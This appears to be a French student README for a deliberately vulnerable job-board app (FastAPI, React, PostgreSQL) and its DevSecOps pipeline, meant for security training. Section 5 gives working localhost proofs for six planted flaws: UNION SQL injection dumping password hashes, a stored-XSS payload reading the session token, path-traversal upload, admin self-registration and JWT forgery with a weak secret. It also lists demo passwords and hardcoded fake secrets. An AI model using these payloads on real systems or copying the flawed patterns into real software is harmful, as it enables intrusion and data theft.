
## 1. Fonctionnalités (lawla du volet A)

| Exigence | Fonctionnalité | Où dans l'application |
|---|---|---|
| EF-01 Authentification | Inscription, connexion, déconnexion, session par jeton JWT | `/connexion`, `/inscription` |
| EF-02 Gestion des rôles | Candidat, recruteur, administrateur avec espaces distincts | `/candidat`, `/recruteur`, `/admin` |
| EF-03 Gestion des offres | Créer, modifier, publier, clôturer, supprimer une offre | Espace recruteur → *Mes offres* |
| — Recherche d'offres | Recherche par mot-clé, ville, type de contrat | `/offres` |
| EF-04 Candidatures | Postuler avec un CV, suivre le statut, retirer une candidature | Détail d'une offre, espace candidat |
| EF-05 CV | Dépôt, liste, téléchargement, suppression des CV | Espace candidat → *Mes CV* |
| — Profils | Profil candidat (coordonnées, compétences, présentation) | Espace candidat → *Mon profil* |
| — Recruteur | Consultation des candidatures reçues, changement de statut | Espace recruteur → *Candidatures reçues* |
| — Administration | Statistiques, gestion des rôles, activation/désactivation des comptes | `/admin` |

## 2. Technologies

| Composant | Choix |
|---|---|
| Backend | Python 3.11+ avec **FastAPI**, SQLAlchemy 2, PyJWT |
| Base de données | **PostgreSQL** 14+ |
| Interface | **React** 18 (Vite), **Tailwind CSS** 3, Framer Motion, HTML/CSS/JavaScript |

## 3. Arborescence

```
jobboard/
├── backend/
│   ├── app/
│   │   ├── main.py            # application FastAPI, CORS, erreurs, fichiers statiques
│   │   ├── config.py          # configuration (secrets fictifs en dur — V6)
│   │   ├── database.py        # connexion PostgreSQL
│   │   ├── models.py          # tables users, jobs, cvs, applications
│   │   ├── schemas.py         # schémas Pydantic
│   │   ├── security.py        # hachage, JWT, rôles (V5)
│   │   ├── seed.py            # données fictives + CV PDF générés
│   │   └── routers/           # auth, users, jobs, applications, cvs, admin
│   ├── requirements.txt
│   ├── requirements.txt (+ Dockerfile)
│   └── .env.example
├── frontend/
│   ├── src/
│   │   ├── pages/             # Home, Jobs, JobDetail, Auth, Candidate, Recruiter, Admin
│   │   ├── components/        # Navbar, Modal, Tabs, JobRow, ...
│   │   └── lib/               # client API, contexte d'authentification, toasts
│   ├── package.json
│   └── vite.config.js         # proxy /api et /uploads -> http://localhost:8000
└── database/
    ├── init.sql              # création de l'utilisateur et de la base
    ├── schema.sql            # schéma : tables, clés, contraintes, index, triggers
    └── seed.sql              # données de démonstration (fictives) en SQL
```

## 4. Installation et lancement (sans Docker)

### Prérequis
- Python 3.11 ou plus récent
- Node.js 18 ou plus récent
- PostgreSQL 14 ou plus récent, démarré sur `localhost:5432`

### 4.1 Base de données
```bash
# 1) Créer l'utilisateur et la base (une seule fois)
psql -U postgres -f database/init.sql

# 2) Créer les tables à partir de notre schéma SQL
psql -U jobboard -d jobboard -f database/schema.sql
```
Le schéma (tables, clés étrangères, contraintes CHECK, index, triggers) est défini
par l'équipe dans `database/schema.sql` — voir la section 3. Les **données de
démonstration** (comptes, offres, CV, candidatures) sont ensuite insérées
automatiquement par l'application au premier démarrage (`app/seed.py`).

Variante : pour charger les données **en SQL** plutôt que par l'application :
```bash
psql -U jobboard -d jobboard -f database/seed.sql
```
(Les PDF des CV correspondants sont fournis dans `backend/uploads/`.)

> Pour réinitialiser : relancer `database/schema.sql` (il supprime puis recrée les
> tables), puis redémarrer le backend.

### 4.2 Backend (terminal 1)
```bash
cd backend
python -m venv .venv
source .venv/bin/activate        # Windows : .venv\Scripts\activate
pip install -r requirements.txt
uvicorn app.main:app --reload --port 8000
```
API : http://localhost:8000 — documentation Swagger : http://localhost:8000/docs

### 4.3 Frontend (terminal 2)
```bash
cd frontend
npm install
npm run dev
```
Application : **http://localhost:5173**

### 4.4 Comptes de démonstration (fictifs)

La base de départ contient **4 comptes, 2 offres, 2 CV et 2 candidatures**. L'équipe
complète ensuite les données (autres recruteurs, candidats, offres…) depuis l'interface.

| Rôle | Nom | E-mail | Mot de passe |
|---|---|---|---|
| Administrateur | Administrateur JobBoard | admin@jobboard.local | admin123 |
| Recruteur (TechVision) | Sami Ben Salah | recruteur@techvision.tn | recruteur123 |
| Candidat — Ingénieure cybersécurité | **Aya Abdallah** (Tunis) | aya.abdallah@gmail.com | aya2026 |
| Candidat — Ingénieure cybersécurité | **Ameni Azouz** (Ariana) | ameni.azouz@gmail.com | ameni2026 |

Les deux offres (Ingénieur DevSecOps, Analyste SOC N2) sont publiées par le **recruteur**
TechVision ; Aya et Ameni ont chacune déposé un CV et une candidature. L'**administrateur**
gère les comptes (liste, activation/désactivation, changement de rôle) et les statistiques.

Pour repartir de zéro : relancer `database/schema.sql` (supprime et recrée les tables), puis
redémarrer le backend (ou charger `database/seed.sql`).

---

## 5. Vulnérabilités volontaires

Six failles relevant de **six catégories OWASP Top 10 (2021)** différentes, conformément
à l'exigence 4.2 du cahier des charges (au moins quatre failles, trois catégories).
Chaque faille est repérée dans le code par un commentaire `[VULN Vx]`.

| ID | Vulnérabilité | Emplacement dans JobBoard | OWASP Top 10 | STRIDE | Risque |
|---|---|---|---|---|---|
| V1 | Injection SQL | Recherche des offres | A03 Injection | Tampering, Information disclosure | Critique |
| V2 | IDOR / contrôle d'accès cassé | Consultation des CV et candidatures | A01 Broken Access Control | Information disclosure, Elevation of privilege | Élevé |
| V3 | XSS stockée | Description des offres et profils | A03 Injection (XSS) | Tampering, Spoofing | Élevé |
| V4 | Upload de fichiers non sécurisé | Dépôt des CV | A04 Insecure Design / A05 | Tampering, Elevation of privilege | Élevé |
| V5 | Authentification faible | Inscription et connexion | A07 Identification & Authentication Failures / A02 | Spoofing | Élevé |
| V6 | Mauvaise configuration de sécurité | Backend et configuration | A05 Security Misconfiguration | Information disclosure | Moyen à élevé |

> Les preuves ci-dessous se rejouent **uniquement sur l'instance locale du groupe**.
> `TOKEN` désigne un jeton obtenu par `POST /api/auth/login`.

### V1 — Injection SQL (Critique)
- **Emplacement** : `backend/app/routers/jobs.py` → `search_jobs()` — `GET /api/jobs/search`
- **Cause** : les paramètres `q`, `location` et `contract` sont concaténés dans la requête SQL (f-string) au lieu d'être passés comme paramètres liés.
- **Impact** : lecture de toute la base (comptes, hachages de mots de passe, données personnelles), contournement des filtres (offres en brouillon).
- **Preuve** :
  ```bash
  # Contourner le filtre "published" : renvoie aussi l'offre en brouillon
  curl -G "http://localhost:8000/api/jobs/search" --data-urlencode "q=') OR 1=1 --"
  # Extraire les comptes et hachages MD5 par UNION
  curl -G "http://localhost:8000/api/jobs/search" \
    --data-urlencode "q=zzz') UNION SELECT id,email,password_hash,role,'x','x','x','x',created_at FROM users --"
  ```
  Dans l'interface : saisir `') OR 1=1 --` dans le champ de recherche de `/offres`.

### V2 — IDOR / contrôle d'accès cassé (Élevé)
- **Emplacement** : `backend/app/routers/cvs.py` (`/api/cvs/{id}`, `/api/cvs/{id}/download`), `backend/app/routers/applications.py` (`/api/applications/{id}`, `/api/applications/job/{job_id}`, `PATCH /api/applications/{id}/status`), `backend/app/routers/users.py` (`/api/users/{id}`), ainsi que `/uploads/<fichier>` servi sans authentification.
- **Cause** : le serveur vérifie seulement que l'utilisateur est connecté, jamais qu'il est **propriétaire** de la ressource ou **recruteur de l'offre** concernée.
- **Impact** : un candidat lit les CV, adresses, téléphones et dates de naissance des autres candidats ; un recruteur concurrent consulte les candidatures d'autres entreprises ; un candidat peut passer sa propre candidature à « Acceptée ».
- **Preuve** (connecté en tant que Yassine, candidat) :
  ```bash
  curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/applications/3      # candidature de Nour
  curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/cvs/2/download -o cv_nour.pdf
  curl -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
       -d '{"status":"acceptee"}' http://localhost:8000/api/applications/1/status
  curl http://localhost:8000/uploads/CV_Nour_Hammami.pdf                               # sans jeton
  ```

### V3 — XSS stockée (Élevé)
- **Emplacement** : stockage dans `routers/jobs.py` (`description`, `requirements`) et `routers/users.py` (`bio`) ; rendu dans `frontend/src/pages/JobDetail.jsx` et `frontend/src/pages/Recruiter.jsx` (`ApplicationView`) via `dangerouslySetInnerHTML`.
- **Cause** : le HTML saisi est enregistré sans assainissement puis injecté tel quel dans le DOM ; le jeton JWT est conservé dans `localStorage`, donc lisible par un script injecté.
- **Impact** : vol de session d'un recruteur ou d'un candidat, actions à sa place, défiguration des offres.
- **Preuve** : dans *Mon profil* (candidat), mettre dans « Présentation » :
  ```html
  <img src=x onerror="document.title='XSS:'+localStorage.jobboard_token.slice(0,12)">
  ```
  puis postuler ; quand le recruteur clique sur **Examiner**, le script s'exécute dans son navigateur et lit son jeton. Même principe avec la description d'une offre (affichée à tous les visiteurs de `/offres/<id>`).

### V4 — Upload de fichiers non sécurisé (Élevé)
- **Emplacement** : `backend/app/routers/cvs.py` → `upload_cv()` ; montage statique `/uploads` dans `backend/app/main.py`.
- **Cause** : aucune vérification d'extension, de type réel (signature) ni de taille ; le nom de fichier fourni par le client est réutilisé sans assainissement ; le dossier est servi publiquement.
- **Impact** : dépôt de pages HTML/SVG exécutant du JavaScript sur le domaine de l'application, écrasement des CV d'autres candidats (même nom), écriture hors du dossier par traversée de répertoire (`../`), saturation du disque.
- **Preuve** :
  ```bash
  echo '<script>alert(document.domain)</script>' > cv.html
  curl -H "Authorization: Bearer $TOKEN" -F "file=@cv.html;type=text/html" http://localhost:8000/api/cvs/upload
  # ouvrir http://localhost:8000/uploads/cv.html -> le script s'exécute
  curl -H "Authorization: Bearer $TOKEN" -F "file=@cv.html;filename=../evil.html" http://localhost:8000/api/cvs/upload
  # le fichier est écrit dans backend/evil.html, hors du dossier uploads/
  ```

### V5 — Authentification faible (Élevé)
- **Emplacement** : `backend/app/security.py`, `backend/app/routers/auth.py`, `backend/app/schemas.py` (`RegisterIn`).
- **Cause** :
  - mots de passe hachés en **MD5 sans sel** ;
  - aucune politique de mot de passe (`1` accepté) ;
  - aucune limitation des tentatives de connexion ;
  - messages d'erreur distincts (« Aucun compte… » / « Mot de passe incorrect ») → énumération des comptes ;
  - le **rôle est choisi par le client** à l'inscription (`"role":"admin"` accepté) ;
  - JWT signé avec le secret trivial `secret123`, valable **30 jours**, non révoqué à la déconnexion ; le rôle est lu depuis le jeton ; un compte désactivé garde l'accès.
- **Impact** : prise de contrôle de comptes, élévation de privilèges vers administrateur, falsification de jetons.
- **Preuve** :
  ```bash
  # Inscription directe en administrateur
  curl -X POST http://localhost:8000/api/auth/register -H "Content-Type: application/json" \
       -d '{"email":"pirate@test","password":"1","full_name":"Pirate","role":"admin"}'
  # Énumération des comptes
  curl -X POST http://localhost:8000/api/auth/login -H "Content-Type: application/json" -d '{"email":"inconnu@test","password":"x"}'
  curl -X POST http://localhost:8000/api/auth/login -H "Content-Type: application/json" -d '{"email":"nour.h@mail.test","password":"x"}'
  # Falsification d'un jeton administrateur avec le secret faible
  python -c "import jwt,time;print(jwt.encode({'sub':'4','role':'admin','exp':int(time.time())+3600},'secret123',algorithm='HS256'))"
  ```

### V6 — Mauvaise configuration de sécurité (Moyen à élevé)
- **Emplacement** : `backend/app/config.py`, `backend/app/main.py`, `backend/app/routers/admin.py` (`/api/debug/config`), `backend/app/routers/jobs.py`, `backend/app/routers/auth.py`.
- **Cause** :
  - secrets **fictifs** écrits en dur dans le code (`jobboard123`, `secret123`, `FAKE-smtp-key-…`) — cibles du futur scan Gitleaks ;
  - point de terminaison de débogage `/api/debug/config` **sans authentification** qui affiche la configuration et les secrets ;
  - traces d'erreurs complètes renvoyées au client (gestionnaire d'exceptions en mode debug) et requête SQL renvoyée dans la réponse de recherche ;
  - CORS `*` avec identifiants ;
  - aucun en-tête de sécurité (CSP, X-Frame-Options, HSTS, X-Content-Type-Options), en-tête `X-Powered-By` qui divulgue la pile ;
  - mots de passe écrits **en clair** dans les journaux à chaque tentative de connexion ;
  - documentation Swagger `/docs` ouverte ; compte administrateur par défaut `admin123` ;
  - dépendances anciennes épinglées (`starlette 0.41.3` via `fastapi 0.115.6`) — à analyser avec Trivy.
- **Impact** : divulgation des secrets permettant de forger des jetons (V5) et d'accéder à la base, aide à l'exploitation de V1.
- **Preuve** :
  ```bash
  curl http://localhost:8000/api/debug/config
  curl "http://localhost:8000/api/jobs/search?q='"        # trace SQL complète
  curl -I http://localhost:8000/api/health                # pas d'en-têtes de sécurité
  ```
  et observer le terminal du backend après une connexion : `password=...` apparaît en clair.

---

## 6. Volet B — Chaîne DevSecOps

Le volet B outille l'application pour détecter, bloquer, corriger et re-tester les failles.
Tous les fichiers sont fournis ; l'**exécution** se fait dans une **VM Linux (Ubuntu)**.

### 6.1 Arborescence du volet B
```
.github/workflows/devsecops.yml   # pipeline CI/CD bloquant (GitHub Actions)
backend/Dockerfile                # image backend multi-étapes, non-root
frontend/Dockerfile + nginx.conf  # image frontend (nginx non privilégié)
docker-compose.yml                # exécution conteneurisée locale
.env.example                      # secrets fictifs (le vrai .env n'est pas versionné)
k8s/                              # manifests Kubernetes durcis
  ├── 00-namespace.yaml
  ├── 01-postgres.yaml
  ├── 02-backend.yaml             # securityContext restrictif
  ├── 03-frontend.yaml
  ├── 04-networkpolicy.yaml       # refus par défaut + flux autorisés
  ├── 05-configmap-schema.yaml
  ├── secret.example.yaml         # modèle de secret (ne pas versionner le vrai)
  └── falco/falco-rules.yaml      # élément innovant : détection runtime
attack/simulate_attack.sh         # attaque fictive (télémétrie, §4.7)
docs/                             # THREAT_MODEL, BLOCKING_POLICY, SECRETS_MANAGEMENT,
                                  # INCIDENT_RESPONSE, INNOVATION_FALCO
```

### 6.2 Correspondance avec le cahier des charges
| Exigence | Livrable |
|---|---|
| §4.1 Conteneur durci | `backend/Dockerfile`, `frontend/Dockerfile` (multi-étapes, non-root, `.dockerignore`) |
| §4.2 Modèle de menace | `docs/THREAT_MODEL.md` (STRIDE + OWASP, avant/après) |
| §4.3 Pipeline bloquant | `.github/workflows/devsecops.yml`, `docs/BLOCKING_POLICY.md` |
| §4.4 Gestion des secrets | `.env.example`, `k8s/secret.example.yaml`, `docs/SECRETS_MANAGEMENT.md` |
| §4.5 Kubernetes durci | `k8s/` (securityContext, NetworkPolicy refus par défaut) |
| §4.6 DAST | étape ZAP du pipeline (+ exécution manuelle dans la VM) |
| §4.7 Observabilité / réponse | `attack/simulate_attack.sh`, `docs/INCIDENT_RESPONSE.md` |
| Bonus innovant | `k8s/falco/`, `docs/INNOVATION_FALCO.md` (détection runtime) |

### 6.3 

**a) Test conteneurisé rapide (Docker Compose)**
```bash
cp .env.example .env
docker compose up --build
# Application : http://localhost:8080
```

**b) Déploiement Kubernetes (Minikube)**
```bash
minikube start
eval $(minikube docker-env)                 # construire les images dans Minikube
docker build -t jobboard-backend:latest ./backend
docker build -t jobboard-frontend:latest ./frontend

kubectl apply -f k8s/00-namespace.yaml
kubectl apply -f k8s/05-configmap-schema.yaml
kubectl -n jobboard create secret generic jobboard-secrets \
  --from-literal=POSTGRES_PASSWORD=jobboard123 \
  --from-literal=JWT_SECRET=secret123 \
  --from-literal=DATABASE_URL='postgresql+psycopg://jobboard:jobboard123@postgres:5432/jobboard'
kubectl apply -f k8s/01-postgres.yaml
kubectl apply -f k8s/02-backend.yaml
kubectl apply -f k8s/03-frontend.yaml
kubectl apply -f k8s/04-networkpolicy.yaml

kubectl -n jobboard get pods
minikube service frontend -n jobboard       # ouvre l'application
```

**c) Attaque fictive + journaux (§4.7)**
```bash
./attack/simulate_attack.sh http://localhost:8080
kubectl -n jobboard logs -f deploy/backend
```

**d) Élément innovant — Falco** : voir `docs/INNOVATION_FALCO.md`.

### 6.4 Boucle attendue
*Développement → Détection (Semgrep, Gitleaks, Trivy, ZAP) → Blocage (pipeline) →
Correction → Re-test → Déploiement sécurisé.* L'application étant vulnérable au départ,
le pipeline **échoue d'abord** (preuve du §4.3), puis passe au vert après correction.

